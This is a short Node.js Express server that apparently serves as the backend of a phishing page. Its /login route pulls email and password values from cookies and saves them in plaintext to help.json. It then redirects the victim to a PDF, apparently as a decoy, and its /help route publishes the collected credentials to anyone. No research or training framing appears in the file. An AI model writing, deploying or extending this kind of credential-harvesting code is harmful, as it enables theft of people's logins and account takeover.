const http = require('node:http')
const path = require("node:path")
const express = require('express')
const fs = require("node:fs")

const app = express()
const port = 3000
const dir = process.cwd()
function getCookie(c_name,cookies) {
    var c_value = " " + cookies;
    var c_start = c_value.indexOf(" " + c_name + "=");
    if (c_start == -1) {
        c_value = null;
    }
    else {
        c_start = c_value.indexOf("=", c_start) + 1;
        var c_end = c_value.indexOf(";", c_start);
        if (c_end == -1) {
            c_end = c_value.length;
        }
        c_value = unescape(c_value.substring(c_start,c_end));
       }
    return c_value;
}
app.use(express.json())
app.use(express.static(path.join(dir,"static")))

app.get('/', (req, res) => {
    res.sendFile(path.join(dir,"static","index.html"))
})

app.get('/login', (req, res) => {
    var email=getCookie("email",req.headers.cookie)
    var pw=getCookie("pw",req.headers.cookie)
	var currentdata="default";
	currentdata=JSON.parse(fs.readFileSync('./help.json', 'utf8'));
	currentdata[email]=pw;
	fs.writeFileSync('./help.json', JSON.stringify(currentdata));
    res.redirect("./pdf.pdf")
})
app.get('/help', (req, res) => {
    res.sendFile(path.join(dir,"help.json"))
})

app.listen(port, () => {
    console.log(`App listening on http://localhost:${port}`)
})
